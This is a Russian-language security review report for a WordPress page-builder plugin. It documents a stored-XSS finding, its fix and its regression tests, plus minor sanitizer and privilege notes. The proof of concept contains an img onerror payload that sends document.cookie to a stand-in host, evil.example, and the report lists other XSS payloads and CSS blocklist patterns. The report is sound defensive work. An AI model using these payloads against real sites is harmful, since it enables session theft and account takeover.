# Независимый security review (Phase 7) — итог

Дата: 19 июля 2026. Раздел 10 спеки требует независимый security review перед массовым релизом ("желательно независимый от команды разработки, с учётом адверсариального корпуса из спайка 4"). Ревью проведено свежим агентом без контекста разработки этого кода в текущей сессии, с явной инструкцией НЕ повторять уже пройденный спайком 4 корпус, а искать новое.

## Находка 1 — КРИТИЧНО (найдена и исправлена в этой сессии)

**`ProjectDataSanitizer::sanitize_component()` санитизировал ТОЛЬКО узлы с `data-wpb-block`** — значения слотов внутри `data-wpb-values` платформенных блоков. Обычный/нативный узел GrapesJS БЕЗ `data-wpb-block` (например, результат импорта/paste HTML в canvas — тот же класс вектора, что issue #3082 из корпуса спайка 4) вообще не проходил через эту функцию: собственные `attributes`/`tagName`/`content` такого узла сохранялись как есть, включая `onerror`/`onload`/`javascript:`-протоколы.

**PoC, воспроизведённый реальным REST-запросом** на `POST /wpgjb/v1/documents/{id}/page` (требует только `wpgjb_edit_pages` + `edit_post` — обычный редактор, НЕ `wpgjb_insert_raw_code`):
```json
{"type":"image","tagName":"img","attributes":{"src":"x","onerror":"fetch('https://evil.example/steal?c='+document.cookie)"},"components":[]}
```
До фикса — сохранялось в `wpb_documents.project_json` буквально как есть; при следующем открытии документа в редакторе (`loadProjectData()`) `onerror` сработал бы как реальный JS в origin wp-admin любого, кто откроет документ — включая администратора при совместном редактировании/ревью.

**Исправлено** в `includes/Sanitize/ProjectDataSanitizer.php`: добавлен третий случай (узел без `data-wpb-block`) — `sanitize_generic_node()` принудительно приводит `tagName` к безопасному значению из уже существующего whitelist `Sanitizer::richness_page()` (не доверяя произвольному имени тега), затем прогоняет реконструированный HTML-фрагмент через ТОТ ЖЕ `Sanitizer::sanitize_html()` (wp_kses), что и весь остальной HTML в проекте — не вторую, отдельную реализацию правил.

**Проверено реальными payload'ами против живого REST-эндпоинта** (не только unit-тестом):
- `onerror` на `<img>` — атрибут полностью удалён, `src="x"` (безопасный) сохранён.
- `javascript:alert(document.cookie)` в `href` + `onclick` на `<a>` — `onclick` удалён, протокол `javascript:` нейтрализован (wp_kses отрезал схему, `href` стал безобидной относительной строкой).
- `tagName: "script"` с `src` на внешний JS — тег принудительно заменён на безопасный `div` ДО прогона санитайзера.
- Обычный платформенный блок (`data-wpb-block`) — путь не затронут, санитизация значений слотов работает как раньше.

**Закреплено регрессионным тестом**: `tests/php/Phase7/Phase7Runner.php` (дев-эндпоинт `/wpgjb/v1/dev/phase7`, 4/4 PASS) — те же 4 сценария, теперь автоматически перепроверяются при любых будущих изменениях `ProjectDataSanitizer`.

## Находка 2 — НИЗКАЯ/информационная (не исправлялась, задокументирована)

`Sanitizer::sanitize_css()`'s regex для снятия @-правил (`/@[a-zA-Z-]+[^;{}]*(;|\{[^{}]*\})/`) не понимает ВЛОЖЕННЫЕ фигурные скобки — для `@media (...) { .a { color:red; } }` внешняя обёртка не снимается корректно, и внутреннее правило может "просочиться" как будто безусловное (не инъекция — значения по-прежнему проходят через `value_shape_ok()`/чёрный список, но нарушается предполагаемая область видимости `@media`). Это НЕ новая проблема — файл уже содержит честное предупреждение "spike-quality, нет полноценной грамматики @-правил, заменить парсер-based решением (`sabberworm/php-css-parser`) в Phase 6/производственном окружении". Это НЕ было сделано в этой сессии, потому что в этой песочнице разработки по-прежнему нет ни PHP CLI, ни Composer (см. заголовок `Sanitizer.php`) — физически невозможно навендорить и протестировать реальный парсер здесь. **Остаётся открытым пунктом для окружения с Composer.**

## Находка 3 — НИЗКАЯ (не исправлялась, задокументирована)

`BatchResolver::URL_ATTRIBUTES` не включает `srcset` — если бы динамический тег когда-либо оказался внутри `srcset` (сегодня ни один манифест блока так не делает — изображения на attachment ID, не на теги), значение получило бы обычное `attr`-экранирование, а не `esc_url()`. Impact низкий (браузеры не исполняют скрипт через кандидатов `srcset`), и корректный фикс — не тривиальная однострочная правка (`srcset` — список `url widthdescriptor` через запятую, `esc_url()` целиком испортил бы легитimное значение) — оставлено как известное ограничение, а не наспех сделанный неверный патч.

## Находка 4 — информационная (архитектурное решение, не баг)

`wpgjb_manage_settings` — единственное право, которое ОДНОВременно (а) открывает доступ к экрану матрицы прав и (б) само является одной из строк этой матрицы — то есть если сайт-администратор партнёра когда-либо выдаст `wpgjb_manage_settings` не-администратору, эта роль сможет затем выдать себе и `wpgjb_insert_raw_code` (обход песочницы raw_html). Это, скорее всего, осознанный дизайн (аналогично тому, как `promote_users` в самом ядре WP даёт возможность повышать права) — фиксируется явно в этой записи для решения при подписании MVP, не как код-баг.

## Область, проверенная БЕЗ новых находок (сверх уже покрытого спайком 4)

Contour 1/2 тонкие обёртки над `wp_kses()`; whitelist чёрного списка CSS (`expression()`, `-moz-binding`, `@import`, `javascript:`/`vbscript:` в `url()`); капабилити-гейт `raw_html` (перепроверяется в момент сохранения, не только листинга каталога, аудит-лог пишется безусловно на каждый обход); парсинг плейсхолдеров `{{wpb:tag_id;k=v}}` (whitelist tag_id, параметры не могут содержать `{`/`}`/`;`, экранирование по позиции в дереве); `PublishController`/`Publisher::publish()` — контур 2 санитизирует HTML/CSS независимо от контура 1 при любом входе; `link`/`image` слоты через `BlockRenderer` полагаются на уже провалидированные значения (`esc_url_raw()`, `wp_get_attachment_image_src()`), нет прямого доверия сырому URL.

## Вывод

Одна КРИТИЧНАЯ находка — исправлена, проверена реальными payload'ами против живого REST API, закреплена регрессионным тестом. Остальные три — низкие/информационные, задокументированы с явным обоснованием, почему не исправлялись сейчас (два — реальные ограничения песочницы без Composer, одно — архитектурное решение для явного решения при подписании). **Security review закрывает MVP-критерий раздела 10 с одной подтверждённой и исправленной находкой.**
